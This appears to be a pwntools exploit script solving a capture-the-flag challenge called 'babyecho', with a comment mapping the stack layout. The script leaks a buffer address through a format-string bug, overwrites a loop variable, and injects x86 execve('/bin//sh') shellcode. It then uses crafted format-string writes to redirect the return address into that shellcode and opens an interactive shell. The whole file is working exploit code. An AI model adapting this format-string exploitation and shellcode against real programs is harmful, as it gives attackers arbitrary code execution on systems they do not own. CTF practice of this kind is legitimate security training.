from pwn import *

p = process("./babyecho")

'''
Stack layout:
0 -> &buf (0x0)
1 -> v6 (temp)
2 -> 10
3 -> 0
4 -> v6 (0x10)
5 -> &buf
6 -> < flag, on 0 while loop breaks >
7 -> buf[0-4] (0x1c)
.
.
.
263 -> canary (0x41c)
264 -> ebp
265 -> return address
'''

p.recvuntil("bytes\n")

log.info("Leaking address of buf")
p.sendline("%5$x")
addr_buf = int(p.recvline().strip(), 16)

p.recvuntil("bytes\n")

log.info("Updating v6 to 1100")
writes = { addr_buf - 4*3 : 90 }
payload = fmtstr_payload(7, writes, write_size='int')
log.info("Payload: " + payload)
p.sendline(payload)

p.recvuntil("bytes\n")

log.info("Overwriting return address with buf's addr: " + str(hex(addr_buf)))
log.info("Overwriting flag with 1")
writes = {
  addr_buf + 0x410: addr_buf % (256*256),
  addr_buf + 0x410 + 2: addr_buf / (256*256),
  addr_buf - 4: 50
}
payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
payload = payload.ljust(32, "a")
payload += fmtstr_payload(7 + 8, writes, write_size='int', numbwritten=len(payload))
log.info("Payload: " + payload)
p.sendline(payload)

p.interactive()